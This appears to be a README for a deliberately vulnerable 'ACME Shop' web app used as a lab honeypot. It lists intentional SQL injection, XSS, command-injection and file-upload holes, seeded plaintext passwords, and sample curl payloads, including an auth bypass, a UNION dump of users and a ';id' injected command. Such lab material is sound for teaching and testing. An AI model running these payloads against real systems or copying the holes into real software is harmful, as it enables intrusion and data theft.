# Vulnerable HTTP web app honeypot
Port 8080 → 5000. The primary attack target — "ACME Shop" with SQLite backend.

## Vulnerabilities (intentional)
| Endpoint            | Vuln class          |
|---------------------|---------------------|
| `/login` (POST)     | SQL injection       |
| `/product?id=`      | SQL injection       |
| `/search?q=`        | Reflected XSS       |
| `/api/ping?host=`   | Command injection   |
| `/upload` (POST)    | Arbitrary file upload |

## Default users (seeded SQLite DB)
| user  | pass     |
|-------|----------|
| admin | s3cr3t   |
| alice | alicepw  |
| bob   | bobpw    |

## Sample attacks (run from Computer 3)
```
# SQLi auth bypass
curl 'http://192.168.1.10:8080/login' -d "u=admin'--&p=x"
# SQLi UNION
curl 'http://192.168.1.10:8080/product?id=1 UNION SELECT user,pass,1 FROM users'
# Cmd injection
curl 'http://192.168.1.10:8080/api/ping?host=127.0.0.1;id'
# Reflected XSS
curl 'http://192.168.1.10:8080/search?q=<script>alert(1)</script>'
```
